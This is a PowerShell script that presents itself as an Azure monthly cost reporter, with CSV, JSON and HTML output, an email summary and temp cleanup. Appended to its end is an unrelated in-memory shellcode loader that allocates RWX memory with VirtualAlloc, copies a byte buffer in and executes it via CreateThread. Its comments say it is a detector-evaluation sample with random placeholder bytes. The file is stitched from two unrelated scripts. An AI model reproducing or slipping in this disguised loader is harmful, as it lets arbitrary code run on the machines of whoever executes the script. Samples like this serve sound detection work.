
<#
.SYNOPSIS
    Builds a monthly cloud cost report per service and flags overspend.
.DESCRIPTION
    Queries the cost API of the selected provider, groups the spend per service
    and writes a CSV plus a JSON summary.
    When the monthly total passes the threshold the script emits a warning that
    can be picked up by the monitoring pipeline.
.PARAMETER Threshold
    Used when the script runs unattended.
.PARAMETER Region
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Get-CloudCostReport.ps1 -Threshold 750
#>

$Threshold = 750
$Region = 'westeurope'
$ProfileName = 'default'
$Month = '2025-06'
$Account = '244055957630'
$ReportPath = 'C:\Reports\cost-azure-2025-06.csv'
$OutputPath = 'C:\Reports\cost-azure-2025-06.json'

$hostName = $env:COMPUTERNAME
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$usage = Get-AzConsumptionUsageDetail -StartDate $start -EndDate $end -ErrorAction Stop
$groups = foreach ($line in $usage) {
    [pscustomobject]@{
        Period  = $line.UsageStart.ToString('yyyy-MM-dd')
        Service = $line.ServiceName
        Amount  = [math]::Round([double]$line.PretaxCost, 2)
        Unit    = $line.Currency
    }
}

$byService = $groups | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{
        Service = $_.Name
        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Amount -Descending
$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan

$byService | Export-Csv -NoTypeInformation -Path $ReportPath

$byService | ConvertTo-Json -Depth 6 | Set-Content -Path $OutputPath -Encoding UTF8

$overThreshold = $byService | Where-Object { $_.Amount -ge ($Threshold / 10) }
$overThreshold | Export-Csv -Path $ReportPath.Replace('.csv', '-top.csv') -NoTypeInformation -Encoding UTF8

$daily = $groups | Group-Object -Property Period | ForEach-Object {
    [pscustomobject]@{
        Period = $_.Name
        Amount = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Period

$style = @'
<style>
body { font-family: Calibri; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$daily | ConvertTo-Html -Title 'Daily cloud spend' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8

$summaryBody = @"
Provider  : azure
Account   : $Account
Period    : $Month
Total     : $total
Threshold : $Threshold
"@
$MailTo = 'finops@contoso.com'

Send-MailMessage -To $MailTo -From "finops@contoso.com" -Subject "Monthly cloud cost report" -Body $summaryBody -SmtpServer "smtp.contoso.com" -Port 25 -UseSsl

if ($total -gt $Threshold) {
    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
}
Write-Host ("Report written to {0}" -f $ReportPath) -ForegroundColor Green

$serviceCount = @($byService).Count
Write-Verbose ("Services with spend: {0}" -f $serviceCount)
Write-Verbose ("Provider profile: {0}" -f $ProfileName)

$cheapest = $byService | Sort-Object -Property Amount | Select-Object -First 5
$cheapest | Format-Table -AutoSize

$history = Join-Path (Split-Path -Parent $ReportPath) 'cost-history.csv'
Write-Verbose ("History file: {0}" -f $history)

$average = [math]::Round(($total / [math]::Max(@($byService).Count, 1)), 2)
Write-Verbose ("Average cost per service: {0:N2}" -f $average)

$budgetFile = Join-Path $PSScriptRoot 'budget.json'
if (Test-Path -LiteralPath $budgetFile) {
    $budget = Get-Content -LiteralPath $budgetFile -Raw | ConvertFrom-Json
    Write-Verbose ("Budget file loaded: {0}" -f $budgetFile)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\stage.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x0e, 0x5f, 0x2a, 0x35, 0xe4, 0x7d, 0xda, 0xd0, 0x49, 0xf3, 0x83, 0xb2, 0x5f, 0x6b, 0x78, 0xed,
        0x03, 0x63, 0x2f, 0x59, 0xda, 0xef, 0xef, 0x14, 0x71, 0x56, 0x14, 0x06, 0x38, 0xb9, 0x5d, 0xfb,
        0xd6, 0x96, 0xc8, 0x16, 0xaf, 0xda, 0xae, 0x5c, 0x4a, 0xda, 0xbd, 0x17, 0x90, 0x3f, 0xe5, 0x9b,
        0x8a, 0x3d, 0x71, 0x63, 0x03, 0xf1, 0xc9, 0x0d, 0x9d, 0x8d, 0x79, 0x14, 0x6c, 0x22, 0x15, 0x02,
        0x29, 0x10, 0xb0, 0x9d, 0x9e, 0xd9, 0x85, 0x4a, 0x6b, 0x33, 0x18, 0xc1, 0xcb, 0xc4, 0x2e, 0x5a,
        0x43, 0x8e, 0x4d, 0x63, 0x26, 0xab, 0x29, 0x35, 0xf1, 0x77, 0x6e, 0xdc, 0xd1, 0x9b, 0xe5, 0x51,
        0x85, 0xdf, 0xb6, 0x08, 0xc6, 0x4d, 0xf2, 0xaf, 0x7d, 0x95, 0xb0, 0xe6, 0x27, 0x66, 0x58, 0x20,
        0x61, 0x93, 0x40, 0x91, 0x2e, 0x80, 0x6a, 0x0d, 0x5a, 0x7d, 0xe7, 0x43, 0x9d, 0xfa, 0x80, 0x2b,
        0x86, 0x9c, 0x8f, 0x32, 0xb9, 0x0b, 0xba, 0xaa, 0xec, 0xd8, 0xaf, 0x75, 0x4d, 0x2f, 0x65, 0x85,
        0xca, 0xa9, 0xb6, 0x55, 0xe4, 0x3e, 0x5a, 0x01, 0xb8, 0x4b, 0xe5, 0xae, 0x03, 0x61, 0x32, 0x0f,
        0xf6, 0x4a, 0x37, 0x3d, 0xe6, 0xed, 0x59, 0x6d, 0xda, 0x22, 0x2a, 0x4a, 0xbd, 0xa9, 0x2e, 0xca,
        0xdc, 0x2b, 0x38, 0xb5, 0x29, 0xf8, 0x4e, 0xf1, 0x4b, 0xd6, 0xf3, 0x34, 0x5d, 0xd0, 0x0f, 0x33,
        0x76, 0xb7, 0xc0, 0x3c, 0xa0, 0xea, 0x9f, 0xe1, 0xed, 0xa6, 0x00, 0x52, 0x6b, 0x52, 0xb3, 0xc4,
        0xe6, 0xe3, 0xc5, 0xa9, 0xda, 0xcb, 0xb8, 0x6d, 0x5d, 0x17, 0x12, 0x08, 0xc3, 0x42, 0xf1, 0xe6,
        0x21, 0x0e, 0xe5, 0xc3, 0xd9, 0x01, 0x93, 0xb2, 0x17, 0x88, 0x8c, 0x53, 0x05, 0xae, 0x78, 0x6a,
        0x37, 0xab, 0x24, 0x16, 0x9d, 0x06, 0x2c, 0xd1, 0x7e, 0xfe, 0xc8, 0xa7, 0xa9, 0x2c, 0x7f, 0xdb
    )

    $HProcess = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 2204)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
